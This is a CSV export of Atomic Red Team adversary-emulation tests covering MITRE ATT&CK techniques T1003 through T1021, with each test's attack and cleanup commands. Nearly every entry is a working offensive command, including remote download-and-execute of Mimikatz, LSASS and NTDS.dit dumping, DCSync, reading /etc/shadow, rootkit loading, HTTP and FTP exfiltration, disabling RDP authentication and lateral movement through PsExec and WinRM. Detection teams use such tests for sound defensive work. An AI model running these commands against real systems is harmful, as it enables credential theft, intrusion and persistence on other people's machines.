"File","AtomicTest","Command","Cleanup"
"C:\AtomicRedTeam\atomics\T1003.001\T1003.001.yaml","Powershell Mimikatz","IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds
",
"C:\AtomicRedTeam\atomics\T1003.001\T1003.001.yaml","Dump LSASS.exe using imported Microsoft DLLs","#{xordump_exe} -out #{output_file} -x 0x41
","Remove-Item #{output_file} -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1003.001\T1003.001.yaml","Dump LSASS.exe Memory through Silent Process Exit","PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe --silent-process-exit ""#{output_folder}""
","rmdir ""#{output_folder}"" /s /q >nul 2> nul
"
"C:\AtomicRedTeam\atomics\T1003.002\T1003.002.yaml","Registry parse with pypykatz","""#{venv_path}\Scripts\pypykatz"" live lsa 
",
"C:\AtomicRedTeam\atomics\T1003.002\T1003.002.yaml","esentutl.exe SAM copy","esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name}
","del #{copy_dest}\#{file_name} >nul 2>&1
"
"C:\AtomicRedTeam\atomics\T1003.002\T1003.002.yaml","dump volume shadow copy hives with certutil","for /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\#{target_hive}"" %temp%\#{target_hive}vss%a 2 >nul 2>&1) & dir /B %temp%\#{target_hive}vss*
","for /L %a in (1,1,#{limit}) do @(del %temp%\#{target_hive}vss%a >nul 2>&1)
"
"C:\AtomicRedTeam\atomics\T1003.002\T1003.002.yaml","dump volume shadow copy hives with System.IO.File","1..#{limit} | % { 
 try { [System.IO.File]::Copy(""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$_\Windows\System32\config\#{target_hive}"" , ""$env:TEMP\#{target_hive}vss$_"", ""true"") } catch {}
 ls ""$env:TEMP\#{target_hive}vss$_"" -ErrorAction Ignore
}
","1..#{limit} | % {
  rm ""$env:TEMP\#{target_hive}vss$_"" -ErrorAction Ignore
}
"
"C:\AtomicRedTeam\atomics\T1003.003\T1003.003.yaml","Create Volume Shadow Copy with vssadmin","vssadmin.exe create shadow /for=#{drive_letter}
",
"C:\AtomicRedTeam\atomics\T1003.003\T1003.003.yaml","Copy NTDS.dit from Volume Shadow Copy","copy #{vsc_name}\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
copy #{vsc_name}\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE
","del ""#{extract_path}\ntds.dit""        >nul 2> nul
del ""#{extract_path}\VSC_SYSTEM_HIVE"" >nul 2> nul
del ""#{extract_path}\SYSTEM_HIVE""     >nul 2> nul
"
"C:\AtomicRedTeam\atomics\T1003.003\T1003.003.yaml","Dump Active Directory Database with NTDSUtil","mkdir #{output_folder}
ntdsutil ""ac i ntds"" ""ifm"" ""create full #{output_folder}"" q q
","rmdir /q /s #{output_folder} >nul 2>&1
"
"C:\AtomicRedTeam\atomics\T1003.003\T1003.003.yaml","Create Volume Shadow Copy with WMI","wmic shadowcopy call create Volume=#{drive_letter}
",
"C:\AtomicRedTeam\atomics\T1003.003\T1003.003.yaml","Create Volume Shadow Copy remotely with WMI","wmic /node:""#{target_host}"" shadowcopy call create Volume=#{drive_letter}
",
"C:\AtomicRedTeam\atomics\T1003.003\T1003.003.yaml","Create Volume Shadow Copy remotely (WMI) with esentutl","wmic /node:""#{target_host}"" process call create ""cmd.exe /c esentutl.exe /y /vss #{source_path} /d #{target_path}""
",
"C:\AtomicRedTeam\atomics\T1003.003\T1003.003.yaml","Create Volume Shadow Copy with Powershell","(gwmi -list win32_shadowcopy).Create('#{drive_letter}','ClientAccessible')
",
"C:\AtomicRedTeam\atomics\T1003.003\T1003.003.yaml","Create Symlink to Volume Shadow Copy","vssadmin.exe create shadow /for=#{drive_letter}
mklink /D #{symlink_path} \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
",
"C:\AtomicRedTeam\atomics\T1003.003\T1003.003.yaml","Create Volume Shadow Copy with diskshadow","mkdir c:\exfil
diskshadow.exe /s #{filename}
",
"C:\AtomicRedTeam\atomics\T1003.003\T1003.003.yaml","Copy NTDS in low level NTFS acquisition via MFT parsing","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR #{script_url} -UseBasicParsing)
Underlay-Copy -Mode MFT -SourceFile C:\Windows\NTDS\ntds.dit -DestinationFile #{extract_path}\ntds.dit
Underlay-Copy -Mode MFT -SourceFile C:\Windows\System32\config\SYSTEM -DestinationFile #{extract_path}\SYSTEM_HIVE
","remove-item ""#{extract_path}\ntds.dit"" -force -erroraction silentlycontinue
remove-item ""#{extract_path}\SYSTEM_HIVE"" -force -erroraction silentlycontinue
"
"C:\AtomicRedTeam\atomics\T1003.003\T1003.003.yaml","Copy NTDS in low level NTFS acquisition via fsutil","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR #{script_url} -UseBasicParsing)
Underlay-Copy -Mode Metadata -SourceFile C:\Windows\NTDS\ntds.dit -DestinationFile #{extract_path}\ntds.dit
Underlay-Copy -Mode Metadata -SourceFile C:\Windows\System32\config\SYSTEM -DestinationFile #{extract_path}\SYSTEM_HIVE
","remove-item ""#{extract_path}\ntds.dit"" -force -erroraction silentlycontinue
remove-item ""#{extract_path}\SYSTEM_HIVE"" -force -erroraction silentlycontinue
"
"C:\AtomicRedTeam\atomics\T1003.004\T1003.004.yaml","Dumping LSA Secrets","""#{psexec_exe}"" -accepteula -s reg save HKLM\security\policy\secrets %temp%\secrets /y
","del %temp%\secrets >nul 2> nul"
"C:\AtomicRedTeam\atomics\T1003.006\T1003.006.yaml","DCSync (Active Directory)","#{mimikatz_path} ""lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain}"" ""exit""
",
"C:\AtomicRedTeam\atomics\T1003.006\T1003.006.yaml","Run DSInternals Get-ADReplAccount","Get-ADReplAccount -All -Server #{logonserver}
",
"C:\AtomicRedTeam\atomics\T1003.007\T1003.007.yaml","Dump individual process memory with sh (Local)","sh #{script_path}
PID=$(pgrep -n -f ""#{pid_term}"")
HEAP_MEM=$(grep -E ""^[0-9a-f-]* r"" /proc/""$PID""/maps | grep heap | cut -d' ' -f 1)
MEM_START=$(echo $((0x$(echo ""$HEAP_MEM"" | cut -d""-"" -f1))))
MEM_STOP=$(echo $((0x$(echo ""$HEAP_MEM"" | cut -d""-"" -f2))))
MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))
dd if=/proc/""${PID}""/mem of=""#{output_file}"" ibs=1 skip=""$MEM_START"" count=""$MEM_SIZE""
grep -i ""PASS"" ""#{output_file}""
","rm -f ""#{output_file}""
"
"C:\AtomicRedTeam\atomics\T1003.007\T1003.007.yaml","Dump individual process memory with sh on FreeBSD (Local)","sh #{script_path}
PID=$(pgrep -n -f ""#{pid_term}"")
MEM_START=$(head -n 5 /proc/""${PID}""/map | tail -1 | cut -d' ' -f1)
MEM_STOP=$(head -n 5 /proc/""${PID}""/map | tail -1 | cut -d' ' -f2)
MEM_SIZE=$(echo $(($MEM_STOP-$MEM_START)))
dd if=/proc/""${PID}""/mem of=""#{output_file}"" ibs=1 skip=""$MEM_START"" count=""$MEM_SIZE""
strings ""#{output_file}"" | grep -i PASS
","rm -f ""#{output_file}""
"
"C:\AtomicRedTeam\atomics\T1003.007\T1003.007.yaml","Dump individual process memory with Python (Local)","sh #{script_path}
PID=$(pgrep -n -f ""#{pid_term}"")
PYTHON=$(which python || which python3 || which python2)
$PYTHON #{python_script} $PID #{output_file}
grep -i ""PASS"" ""#{output_file}""
","rm -f ""#{output_file}""
"
"C:\AtomicRedTeam\atomics\T1003.007\T1003.007.yaml","Capture Passwords with MimiPenguin","sudo #{MimiPenguin_Location} > #{output_file}
cat #{output_file}
","rm -f #{output_file} > /dev/null
"
"C:\AtomicRedTeam\atomics\T1003.008\T1003.008.yaml","Access /etc/shadow (Local)","sudo cat /etc/shadow > #{output_file}
cat #{output_file}
","rm -f #{output_file}
"
"C:\AtomicRedTeam\atomics\T1003.008\T1003.008.yaml","Access /etc/master.passwd (Local)","sudo cat /etc/master.passwd > #{output_file}
cat #{output_file}
","rm -f #{output_file}
"
"C:\AtomicRedTeam\atomics\T1003.008\T1003.008.yaml","Access /etc/passwd (Local)","cat /etc/passwd > #{output_file}
cat #{output_file}
","rm -f #{output_file}
"
"C:\AtomicRedTeam\atomics\T1003.008\T1003.008.yaml","Access /etc/{shadow,passwd,master.passwd} with a standard bin that's not cat","unamestr=$(uname)
if [ ""$unamestr"" = 'Linux' ]; then echo -e ""e /etc/passwd\n,p\ne /etc/shadow\n,p\n"" | ed > #{output_file}; elif [ ""$unamestr"" = 'FreeBSD' ]; then echo -e ""e /etc/passwd\n,p\ne /etc/master.passwd\n,p\ne /etc/shadow\n,p\n"" | ed > #{output_file}; fi
","rm -f #{output_file}
"
"C:\AtomicRedTeam\atomics\T1003.008\T1003.008.yaml","Access /etc/{shadow,passwd,master.passwd} with shell builtins","testcat(){ (while read line; do echo $line >> #{output_file}; done < $1) }
[ ""$(uname)"" = 'FreeBSD' ] && testcat /etc/master.passwd
testcat /etc/passwd
testcat /etc/shadow
","rm -f #{output_file}
"
"C:\AtomicRedTeam\atomics\T1005\T1005.yaml","Search files of interest and save them to a single zip file (Windows)","$startingDirectory = ""#{starting_directory}""
$outputZip = ""#{output_zip_folder_path}""
$fileExtensionsString = ""#{file_extensions}"" 
$fileExtensions = $fileExtensionsString -split "", ""

New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null

Function Search-Files {
  param (
    [string]$directory
  )
  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {
    $fileExtensions -contains $_.Extension.ToLower()
  }
  return $files
}

$foundFiles = Search-Files -directory $startingDirectory
if ($foundFiles.Count -gt 0) {
  $foundFilePaths = $foundFiles.FullName
  Compress-Archive -Path $foundFilePaths -DestinationPath ""$outputZip\data.zip""

  Write-Host ""Zip file created: $outputZip\data.zip""
  } else {
      Write-Host ""No files found with the specified extensions.""
  }
","Remove-Item -Path  $outputZip\data.zip -Force
"
"C:\AtomicRedTeam\atomics\T1005\T1005.yaml","Find and dump sqlite databases (Linux)","cd $HOME
curl -O #{remote_url}/art
curl -O #{remote_url}/gta.db
curl -O #{remote_url}/sqlite_dump.sh
chmod +x sqlite_dump.sh
find . ! -executable -exec bash -c 'if [[ ""$(head -c 15 {} | strings)"" == ""SQLite format 3"" ]]; then echo ""{}""; ./sqlite_dump.sh {}; fi' \;
","rm -f $HOME/.art
rm -f $HOME/gta.db
rm -f $HOME/sqlite_dump.sh 
"
"C:\AtomicRedTeam\atomics\T1005\T1005.yaml","Copy Apple Notes database files using AppleScript","osascript -e 'tell application ""Finder""' -e 'set destinationFolderPath to POSIX file ""#{destination_path}""' -e 'set notesFolderPath to (path to home folder as text) & ""Library:Group Containers:group.com.apple.notes:""' -e 'set notesFolder to folder notesFolderPath' -e 'set notesFiles to {file ""NoteStore.sqlite"", file ""NoteStore.sqlite-shm"", file ""NoteStore.sqlite-wal""} of notesFolder' -e 'repeat with aFile in notesFiles' -e 'duplicate aFile to folder destinationFolderPath with replacing' -e 'end' -e 'end tell'","rm ""#{destination_path}/NoteStore.sqlite*"""
"C:\AtomicRedTeam\atomics\T1006\T1006.yaml","Read volume boot sector via DOS device path (PowerShell)","$buffer = New-Object byte[] 11
$handle = New-Object IO.FileStream ""\\.\#{volume}"", 'Open', 'Read', 'ReadWrite'
$handle.Read($buffer, 0, $buffer.Length)
$handle.Close()
Format-Hex -InputObject $buffer
",
"C:\AtomicRedTeam\atomics\T1007\T1007.yaml","System Service Discovery - net.exe","net.exe start >> #{output_file}
","del /f /q /s #{output_file} >nul 2>&1
"
"C:\AtomicRedTeam\atomics\T1010\T1010.yaml","List Process Main Windows - C# .NET","C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:#{output_file_name} ""#{input_source_code}""
#{output_file_name}
","del /f /q /s #{output_file_name} >nul 2>&1
"
"C:\AtomicRedTeam\atomics\T1012\T1012.yaml","Enumerate COM Objects in Registry with Powershell","New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR
Get-ChildItem -Path HKCR:\CLSID -Name | Select -Skip 1 > $env:temp\clsids.txt
ForEach($CLSID in Get-Content ""$env:temp\clsids.txt"")
{try{write-output ""$($Position)-$($CLSID)""
write-output ""------------""| out-file #{output_file} -append
write-output $($CLSID)| out-file #{output_file} -append
$handle=[activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID))
$handle | get-member -erroraction silentlycontinue | out-file #{output_file} -append
$position += 1} catch{}}
","remove-item #{output_file} -force -erroraction silentlycontinue
remove-item $env:temp\clsids.txt -force -erroraction silentlycontinue      
"
"C:\AtomicRedTeam\atomics\T1014\T1014.yaml","Loadable Kernel Module based Rootkit","sudo insmod #{rootkit_path}/#{rootkit_name}.ko
","sudo rmmod #{rootkit_name}
sudo rm -rf #{rootkit_path}
"
"C:\AtomicRedTeam\atomics\T1014\T1014.yaml","Loadable Kernel Module based Rootkit","sudo modprobe #{rootkit_name}
","sudo modprobe -r #{rootkit_name}
sudo rm /lib/modules/$(uname -r)/#{rootkit_name}.ko
sudo depmod -a
"
"C:\AtomicRedTeam\atomics\T1014\T1014.yaml","dynamic-linker based rootkit (libprocesshider)","echo #{library_path} | tee -a /etc/ld.so.preload
/usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo ""process hidden""
","sed -i ""\:^#{library_path}:d"" /etc/ld.so.preload
rm -rf #{library_path} /usr/local/bin/evil_script.py /tmp/atomic
"
"C:\AtomicRedTeam\atomics\T1014\T1014.yaml","Loadable Kernel Module based Rootkit (Diamorphine)","sudo modprobe #{rootkit_name}
ping -c 10 localhost >/dev/null & TARGETPID=""$!""
ps $TARGETPID
kill -31 $TARGETPID
ps $TARGETPID || echo ""process ${TARGETPID} hidden""
","kill -63 1
sudo modprobe -r #{rootkit_name}
sudo rm -rf /lib/modules/$(uname -r)/#{rootkit_name}.ko /tmp/atomic
sudo depmod -a
"
"C:\AtomicRedTeam\atomics\T1016\T1016.yaml","List Open Egress Ports","$ports = Get-content ""#{port_file}""
$file = ""#{output_file}""
$totalopen = 0
$totalports = 0
New-Item $file -Force
foreach ($port in $ports) {
    $test = new-object system.Net.Sockets.TcpClient
    $wait = $test.beginConnect(""allports.exposed"", $port, $null, $null)
    $wait.asyncwaithandle.waitone(250, $false) | Out-Null
    $totalports++ | Out-Null
    if ($test.Connected) {
        $result = ""$port open"" 
        Write-Host -ForegroundColor Green $result
        $result | Out-File -Encoding ASCII -append $file
        $totalopen++ | Out-Null
    }
    else {
        $result = ""$port closed"" 
        Write-Host -ForegroundColor Red $result
        $totalclosed++ | Out-Null
        $result | Out-File -Encoding ASCII -append $file
    }
}
$results = ""There were a total of $totalopen open ports out of $totalports ports tested.""
$results | Out-File -Encoding ASCII -append $file
Write-Host $results
","Remove-Item -ErrorAction ignore ""#{output_file}""
"
"C:\AtomicRedTeam\atomics\T1016\T1016.yaml","Adfind - Enumerate Active Directory Subnet Objects","""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=subnet) #{optional_args}
",
"C:\AtomicRedTeam\atomics\T1016\T1016.yaml","Qakbot Recon","""#{recon_commands}""
",
"C:\AtomicRedTeam\atomics\T1016.001\T1016.001.yaml","Check internet connection using ping Windows","ping -n 4 #{ping_target}
",
"C:\AtomicRedTeam\atomics\T1016.001\T1016.001.yaml","Check internet connection using ping freebsd, linux or macos","ping -c 4 #{ping_target}
",
"C:\AtomicRedTeam\atomics\T1016.001\T1016.001.yaml","Check internet connection using Test-NetConnection in PowerShell (ICMP-Ping)","Test-NetConnection -ComputerName #{target}
",
"C:\AtomicRedTeam\atomics\T1016.001\T1016.001.yaml","Check internet connection using Test-NetConnection in PowerShell (TCP-HTTP)","Test-NetConnection -CommonTCPPort HTTP -ComputerName #{target}
",
"C:\AtomicRedTeam\atomics\T1016.001\T1016.001.yaml","Check internet connection using Test-NetConnection in PowerShell (TCP-SMB)","Test-NetConnection -CommonTCPPort SMB -ComputerName #{target}
",
"C:\AtomicRedTeam\atomics\T1018\T1018.yaml","Remote System Discovery - nltest","nltest.exe /dclist:#{target_domain}
",
"C:\AtomicRedTeam\atomics\T1018\T1018.yaml","Remote System Discovery - ping sweep","for /l %i in (#{start_host},1,#{stop_host}) do ping -n 1 -w 100 #{subnet}.%i  
",
"C:\AtomicRedTeam\atomics\T1018\T1018.yaml","Remote System Discovery - sweep","for ip in $(seq #{start_host} #{stop_host}); do ping -c 1 #{subnet}.$ip; [ $? -eq 0 ] && echo ""#{subnet}.$ip UP"" || : ; done
",
"C:\AtomicRedTeam\atomics\T1018\T1018.yaml","Remote System Discovery - adidnsdump","""#{venv_path}\Scripts\adidnsdump"" -u #{user_name} -p #{acct_pass} --print-zones #{host_name}
",
"C:\AtomicRedTeam\atomics\T1018\T1018.yaml","Adfind - Enumerate Active Directory Computer Objects","""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=computer) #{optional_args}
",
"C:\AtomicRedTeam\atomics\T1018\T1018.yaml","Adfind - Enumerate Active Directory Domain Controller Objects","""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" #{optional_args} -sc dclist
",
"C:\AtomicRedTeam\atomics\T1018\T1018.yaml","Enumerate Remote Hosts with Netscan","cmd /c '#{netscan_path}' /hide /auto:""$env:temp\T1018NetscanOutput.txt"" /range:'#{range_to_scan}'","remove-item ""$env:temp\T1018NetscanOutput.txt"" -force -erroraction silentlycontinue
"
"C:\AtomicRedTeam\atomics\T1020\T1020.yaml","IcedID Botnet HTTP PUT","$fileName = ""#{file}""
$url = ""#{domain}""
$file = New-Item -Force $fileName -Value ""This is ART IcedID Botnet Exfil Test""
$contentType = ""application/octet-stream""
try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}","$fileName = ""#{file}""
Remove-Item -Path $fileName -ErrorAction Ignore"
"C:\AtomicRedTeam\atomics\T1020\T1020.yaml","Exfiltration via Encrypted FTP","$sampleData = ""Sample data for exfiltration test""
Set-Content -Path ""#{sampleFile}"" -Value $sampleData
$ftpUrl = ""#{ftpServer}""
$creds = Get-Credential -Credential ""#{credentials}""
Invoke-WebRequest -Uri $ftpUrl -Method Put -InFile ""#{sampleFile}"" -Credential $creds
","Remove-Item -Path ""#{sampleFile}"" -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1021.001\T1021.001.yaml","RDP to DomainController","$Server=#{logonserver}
$User = Join-Path #{domain} #{username}
$Password=""#{password}""
cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password
mstsc /v:$Server
echo ""RDP connection established""
","$p=Tasklist /svc /fi ""IMAGENAME eq mstsc.exe"" /fo csv | convertfrom-csv
if(-not ([string]::IsNullOrEmpty($p.PID))) { Stop-Process -Id $p.PID }
"
"C:\AtomicRedTeam\atomics\T1021.001\T1021.001.yaml","Changing RDP Port to Non Standard Port via Powershell","Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name ""PortNumber"" -Value #{NEW_Remote_Port}
New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort #{NEW_Remote_Port}
","Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name ""PortNumber"" -Value #{OLD_Remote_Port}
Remove-NetFirewallRule -DisplayName ""RDPPORTLatest-TCP-In"" -ErrorAction Ignore 
Get-Service TermService | Restart-Service -Force -ErrorAction Ignore 
"
"C:\AtomicRedTeam\atomics\T1021.001\T1021.001.yaml","Changing RDP Port to Non Standard Port via Command_Prompt","reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v PortNumber /t REG_DWORD /d #{NEW_Remote_Port} /f
netsh advfirewall firewall add rule name=""RDPPORTLatest-TCP-In"" dir=in action=allow protocol=TCP localport=#{NEW_Remote_Port}
","reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v PortNumber /t REG_DWORD /d #{OLD_Remote_Port} /f >nul 2>&1
netsh advfirewall firewall delete rule name=""RDPPORTLatest-TCP-In"" >nul 2>&1
net stop TermService /y >nul 2>&1
net start TermService >nul 2>&1
"
"C:\AtomicRedTeam\atomics\T1021.001\T1021.001.yaml","Disable NLA for RDP via Command Prompt","reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v UserAuthentication /d 0 /t REG_DWORD /f
","reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v UserAuthentication /d #{Default_UserAuthentication} /t REG_DWORD -f >nul 2>&1
"
"C:\AtomicRedTeam\atomics\T1021.002\T1021.002.yaml","Map admin share","cmd.exe /c ""net use \\#{computer_name}\#{share_name} #{password} /u:#{user_name}""
",
"C:\AtomicRedTeam\atomics\T1021.002\T1021.002.yaml","Map Admin Share PowerShell","New-PSDrive -name #{map_name} -psprovider filesystem -root \\#{computer_name}\#{share_name}
",
"C:\AtomicRedTeam\atomics\T1021.002\T1021.002.yaml","Copy and Execute File with PsExec","""#{psexec_exe}"" #{remote_host} -accepteula -c #{command_path}
",
"C:\AtomicRedTeam\atomics\T1021.002\T1021.002.yaml","Execute command writing output to local Admin Share","cmd.exe /Q /c #{command_to_execute} 1> \\127.0.0.1\ADMIN$\#{output_file} 2>&1
",
"C:\AtomicRedTeam\atomics\T1021.003\T1021.003.yaml","PowerShell Lateral Movement using MMC20","[activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.application"",""#{computer_name}"")).Document.ActiveView.ExecuteShellCommand(""c:\windows\system32\calc.exe"", $null, $null, ""7"")
",
"C:\AtomicRedTeam\atomics\T1021.003\T1021.003.yaml","PowerShell Lateral Movement Using Excel Application Object","copy c:\windows\system32\calc.exe 'C:\users\#{user}\AppData\local\Microsoft\WindowsApps\foxprow.exe'
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""Excel.Application"",""#{computer_name}""))
$com.ActivateMicrosoftApp(""5"")
","Remove-Item 'C:\users\#{user}\AppData\local\Microsoft\WindowsApps\foxprow.exe'
"
"C:\AtomicRedTeam\atomics\T1021.004\T1021.004.yaml","ESXi - Enable SSH via PowerCLI","Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false 
Connect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}
Get-VMHostService -VMHost #{vm_host} | Where-Object {$_.Key -eq ""TSM-SSH"" } | Start-VMHostService -Confirm:$false
","Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false 
Connect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}
Get-VMHostService -VMHost #{vm_host} | Where-Object {$_.Key -eq ""TSM-SSH"" } | Stop-VMHostService -Confirm:$false
"
"C:\AtomicRedTeam\atomics\T1021.004\T1021.004.yaml","ESXi - Enable SSH via VIM-CMD","echo """" | ""#{plink_file}"" -batch ""#{vm_host}"" -ssh -l #{vm_user} -pw ""#{vm_pass}"" ""vim-cmd hostsvc/enable_ssh""
","echo """" | ""#{plink_file}"" -batch ""#{vm_host}"" -ssh -l #{vm_user} -pw ""#{vm_pass}"" ""vim-cmd hostsvc/disable_ssh""
"
"C:\AtomicRedTeam\atomics\T1021.006\T1021.006.yaml","WinRM Access with Evil-WinRM","evil-winrm -i #{destination_address} -u #{user_name} -p #{password}",
